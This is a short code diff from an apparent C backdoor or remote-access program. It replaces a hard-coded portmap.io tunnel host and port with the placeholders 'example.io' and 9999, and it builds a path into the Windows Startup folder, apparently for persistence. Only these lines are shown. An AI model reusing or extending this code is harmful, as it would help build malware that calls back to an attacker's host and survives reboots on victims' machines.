@@ -432,7 +432,7 @@ int main( int argc, char* argv[] ) {
         return 1;
     }
 
-    host_name = "ehonline-43241.portmap.io";
+    host_name = "example.io";
     remoteHost = gethostbyname(host_name);
     
     if ( remoteHost == NULL ) {
@@ -461,7 +461,7 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 43241;
+    int PORT = 9999;
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
